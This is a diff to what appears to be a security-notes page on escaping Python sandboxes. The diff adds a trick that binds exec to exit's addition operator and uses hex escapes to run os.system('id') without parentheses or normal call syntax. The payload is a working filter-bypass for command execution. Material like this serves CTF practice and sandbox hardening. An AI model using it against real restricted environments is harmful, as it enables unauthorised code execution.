@@ -34,6 +34,13 @@ class _:pass
 **Note**: In the string, you can encode any other characters it doesn't accept by using `\x` hex escapes
 {% endhint %}
 
+And another completely different way using method overriding:
+
+```python
+exit.__class__.__add__ = exec
+exit + "import os; os.system\x28'id'\x29"
+```
+
 ### Strings without quotes
 
 You can create arbitrary strings without using a `"` or `'` character by using the `chr()` function which takes an ASCII number:
